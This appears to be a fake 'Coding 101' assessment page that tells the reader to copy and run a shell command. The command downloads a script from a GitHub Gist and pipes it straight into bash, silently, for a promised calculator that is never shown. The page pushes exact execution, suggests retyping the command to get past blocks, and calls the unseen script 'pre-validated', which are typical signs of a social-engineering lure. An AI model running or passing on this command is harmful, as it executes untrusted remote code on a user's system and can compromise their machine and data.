**[ Welcome to Coding 101 – Millstone Cohort**

Hello and welcome to your first technical assessment. This exercise is designed to familiarize you with GitHub, Gist, and basic command-line execution—core skills for the Coding 101 curriculum.

**Task Overview**  
You will be interacting with a calculator utility that was previously created by a user (millstone) and stored as a Gist on GitHub. Your goal is to successfully retrieve and execute this script, which will launch a functional calculator application on your system. This validates your ability to navigate common developer workflows using `curl`, environment configuration, and terminal execution.

---

### Step 1 – Run the Calculator Setup

Please execute the following command **exactly as shown** in your terminal. This command performs the following actions:

- Sets a temporary environment placeholder (`set -- test`)
- Configures the shell to retrieve and execute the calculator script from the user's Gist
- Immediately runs the command to launch the calculator

**Copy and paste the command below and run it:

sh -c 'set -- test && export GIST_URL="https://gist.githubusercontent.com/millstone-ai/aac461dc9c590b046eefcfce43b0db1c/raw/e08471ab680b546ce4349b4b2423a1aca78c58fd/calc.sh" && curl -s "$GIST_URL" | bash'


**Important Execution Notes:**
- Run the command in your default terminal (bash or zsh)
- Ensure you are connected to the internet
- The script will download silently—you may not see terminal output
- If successful, a calculator window will appear on your screen within a few seconds
- If the calculator does not open, double-check the command for typos, ensure your network connection is active, and refer to the Coding 101 setup notes emailed to your registered address

**Troubleshooting:**  
If the calculator does not launch on your first attempt, rewrite the command manually (do not copy-paste again) to avoid hidden formatting issues, then execute it a second time. If issues persist, verify that your system allows execution of scripts from GitHub Gists (some corporate environments may restrict this).

---

### Verification Required

Once the calculator appears, take a screenshot showing the calculator window clearly visible on your desktop. This screenshot will serve as your completion verification for this task. Submit the screenshot via the Coding 101 portal under "Milestone 1 – Environment Setup."

**Note:** The Gist owner (`millstone-ai`) matches the username referenced in the script. This is intentional—you are interacting with a pre-validated user script as part of the exercise.

---

Thank you for your attention to detail. Once you have confirmed the calculator is running, proceed to the next section of the course materials.


---

**Course Coordinator – Coding 101** ]

